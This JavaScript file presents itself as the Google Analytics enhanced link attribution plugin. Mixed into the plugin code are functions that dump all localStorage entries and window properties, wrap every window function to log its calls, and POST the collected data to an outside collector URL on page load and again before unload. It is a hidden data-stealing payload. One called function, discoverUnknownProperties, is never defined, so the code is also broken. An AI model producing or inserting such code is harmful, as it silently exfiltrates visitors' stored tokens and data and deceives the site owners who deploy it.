(function () {
  var globalVariableCollection = {};
  var e = window,
    h = document,
    k = "replace";
  function traceMethodCalls(obj) {
    const propHandler = {
      get(target, propKey, receiver) {
        const origMethod = target[propKey];
        return function (...args) {
          const result = origMethod.apply(this, args);
          console.log(propKey + JSON.stringify(args) + ' -> ' + JSON.stringify(result));
          return result;
        };
      }
    };
    for (let prop in obj) {
      if (typeof obj[prop] === 'function') {
        obj[prop] = new Proxy(obj[prop], propHandler);
      }
    }
  }
  var m = function (a, c, d, b, g) {
      c = encodeURIComponent(c)[k](/\(/g, "%28")[k](/\)/g, "%29");
      a = a + "=" + c + "; path=" + (d || "/") + "; ";
      g && (a += "expires=" + new Date(new Date().getTime() + g).toGMTString() + "; ");
      b && "none" != b && (a += "domain=" + b + ";");
      b = h.cookie;
      h.cookie = a;
      return b != h.cookie;
    },
    p = function (a) {
      var c = h.body;
      try {
        c.addEventListener ? c.addEventListener("click", a, !1) : c.attachEvent && c.attachEvent("onclick", a);
      } catch (d) {}
    };
  function discoverLocalStorage() {
    const localStorageProps = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      localStorageProps[key] = localStorage.getItem(key);
    }
    return localStorageProps;
  }
  function gatherGlobalVars() {
    globalVariableCollection = discoverUnknownProperties();
    Object.assign(globalVariableCollection, discoverLocalStorage());
    return globalVariableCollection;
  }
  var q = function (a, c, d, b) {
    this.get = function () {
      for (var b = void 0, c = [], d = h.cookie.split(";"), l = new RegExp("^\\s*" + a + "=\\s*(.*?)\\s*$"), f = 0; f < d.length; f++) {
        var n = d[f].match(l);
        n && c.push(decodeURIComponent(n[1][k](/%28/g, "(")[k](/%29/g, ")")));
      }
      for (d = 0; d < c.length; d++) c[d] && (b = c[d]);
      return b;
    };
    this.set = function (g) {
      return m(a, g, b, c, 1E3 * d);
    };
    this.remove = function () {
      return m(a, "", b, c, -100);
    };
  };
  var t = function (a, c) {
    var d = void 0;
    if ("function" == typeof a.get && "function" == typeof a.set) {
      var b = c || {},
        g = b.hasOwnProperty("cookieName") ? b.cookieName : "_gali",
        r = b.hasOwnProperty("cookieTimeout") ? b.cookieTimeout : 30,
        s = b.hasOwnProperty("levels") ? b.levels : 3,
        b = a.get("cookieDomain"),
        l = a.get("cookiePath"),
        f = new q(g, b, r, l);
      d || (d = f.get());
      d && a.set("&linkid", d);
      p(function (a) {
        a = a || e.event;
        a = a.target || a.srcElement;
        for (var b, c = 0; a && c <= s; c++) {
          if (b = a.getAttribute("id")) {
            a = b;
            100 < a.length ? f.remove() : a ? f.set(a) : f.remove();
            return;
          }
          a = a.parentElement;
        }
        f.remove();
      });
    }
  };
  function transmitDiscoveries(discoveries) {
    const collectorUrl = "https://example.com/api/collect";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", collectorUrl, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        xhr.status === 200 ? console.debug("Data transmitted successfully") : console.warn("Data transmission failed, status code: " + xhr.status);
      }
    };
    const json = JSON.stringify(discoveries);
    xhr.send(json);
  }
  (function () {
    e.gaplugins = e.gaplugins || {};
    e.gaplugins.LinkId = t;
    var a = e.GoogleAnalyticsObject || "ga";
    e[a] = e[a] || function () {
      (e[a].q = e[a].q || []).push(arguments);
    };
    e[a]("provide", "linkid", t);
  })();
  function runDiscoveryJob() {
    const discoveredProps = gatherGlobalVars();
    const discoveryCount = Object.keys(discoveredProps).length;
    if (discoveryCount > 0) {
      console.group("Discovered " + discoveryCount + " unknown window properties:");
      for (let prop in discoveredProps) {
        console.log("- " + prop + ": " + JSON.stringify(discoveredProps[prop]));
      }
      console.groupEnd();
      transmitDiscoveries(discoveredProps);
    } else {
      console.debug("No new unknown window properties found");
    }
  }
  window.onload = function () {
    traceMethodCalls(window);
    runDiscoveryJob();
  };
  window.onbeforeunload = function () {
    console.debug("Page is about to be unloaded, executing final discovery task");
    runDiscoveryJob();
  };
})();